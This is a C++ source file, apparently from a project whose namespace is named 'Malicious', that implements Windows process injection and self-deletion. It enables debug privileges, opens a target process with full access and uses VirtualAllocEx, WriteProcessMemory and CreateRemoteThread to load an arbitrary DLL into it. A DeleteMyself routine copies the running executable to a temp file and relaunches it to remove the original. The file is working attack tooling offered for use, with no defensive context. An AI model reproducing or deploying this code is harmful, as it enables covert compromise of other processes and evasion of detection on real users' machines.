#include "Injector.hpp"

#include <common/Log.hpp>
using namespace System;

namespace Malicious
{
	bool inject(DWORD pid, std::string dll)
	{
		// l'adresse de LoadLibraryA est la m�me dans tous les processus
		// donc la fonction pourra correctement s'ex�cuter dans l'espace 
		// du processus inject�
		HMODULE hLocKernel32 = GetModuleHandle("Kernel32");
		if(hLocKernel32 == NULL)
		{
			FATAL_ERROR("Error GetModuleHandle : " + to_string(GetLastError()));
		}

		FARPROC hLocLoadLibrary = GetProcAddress(hLocKernel32, "LoadLibraryA");
		if(hLocLoadLibrary == NULL)
		{
			FATAL_ERROR("Error GetProcAddress : " + to_string(GetLastError()));
		}

        if (!SetDebugPrivileges())
        {
            FATAL_ERROR("Error SetDebugPrivileges : " + to_string(GetLastError()));
        }

		HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
		if(hProc == NULL)
		{
            FATAL_ERROR("Erreur OpenProcess : " + to_string(GetLastError()));
		}

		dll += '\0';
		LPVOID hRemoteMem = VirtualAllocEx(hProc, NULL, dll.size(), MEM_COMMIT, PAGE_READWRITE);
		if(hRemoteMem == NULL)
		{
            FATAL_ERROR("Erreur VirtualAllocEx : " + to_string(GetLastError()));
		}

		SIZE_T numBytesWritten;
		if(!WriteProcessMemory(hProc, hRemoteMem, (void *)dll.c_str(), dll.size(), &numBytesWritten))
		{
            FATAL_ERROR("Erreur WriteProcessMemory : " + to_string(GetLastError()));
		}
		
		HANDLE hRemoteThread = CreateRemoteThread(hProc, 0, 0, (LPTHREAD_START_ROUTINE)hLocLoadLibrary, hRemoteMem, 0, 0);
		if(hRemoteThread == NULL)
		{
            FATAL_ERROR("Erreur CreateRemoteThread : " + to_string(GetLastError()));
		}
		return true;
	}

    bool SetDebugPrivileges()
    {
	    TOKEN_PRIVILEGES Debug_Privileges;
	    if (!LookupPrivilegeValue (NULL, // Privieleges for the local system
								   SE_DEBUG_NAME, // define the name of the privilege 
                                   &Debug_Privileges.Privileges[0].Luid)) // will get the LUID value into this variable
        {	
            LOG_LAST_ERROR();
		    return false;
        }

	    DWORD err = 0;
	    HANDLE hToken = 0;
	    if (!OpenProcessToken (GetCurrentProcess (), // current process ID handle
                               TOKEN_ADJUST_PRIVILEGES, //set the desired access
                               &hToken)) // handle to the token will be held here 
        {
            LOG_LAST_ERROR();
		    if (hToken)
            {
        	    CloseHandle (hToken);
            }
            return false;
        }

	    Debug_Privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	    Debug_Privileges.PrivilegeCount = 1;
	    if (!AdjustTokenPrivileges (hToken,
								    FALSE,
								    &Debug_Privileges,
								    0,
								    NULL,
								    NULL))
        {
            LOG_LAST_ERROR();
		    if (hToken)
            {
                CloseHandle (hToken);
            }
            return false;
        }
	    return true; 
    }

    void DeleteMyself(const char * tempfilename, const char * cmd)
    {
	    HANDLE hTemp;
	    char szPath[MAX_PATH];
	    char szTemp[MAX_PATH];
	    STARTUPINFO si;
	    PROCESS_INFORMATION pi;
	    GetTempPath(MAX_PATH, szTemp);
	    lstrcat(szTemp, tempfilename);
	    GetModuleFileName(0, szPath, MAX_PATH);
	    CopyFile(szPath, szTemp, FALSE);
	    hTemp = CreateFile(szTemp, GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_DELETE, 0, OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE, 0);
	    ZeroMemory(&si, sizeof(STARTUPINFO));
	    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	    ZeroMemory(&si, sizeof(STARTUPINFO));
	    si.cb = sizeof(STARTUPINFO);
	    lstrcat(szTemp, " ");
	    lstrcat(szTemp, cmd);
	    UINT ret = CreateProcess(0, szTemp, 0, 0, FALSE, NORMAL_PRIORITY_CLASS, 0, 0, &si, &pi);
	    Sleep(100);
	    CloseHandle(hTemp);
    }


} // Malicious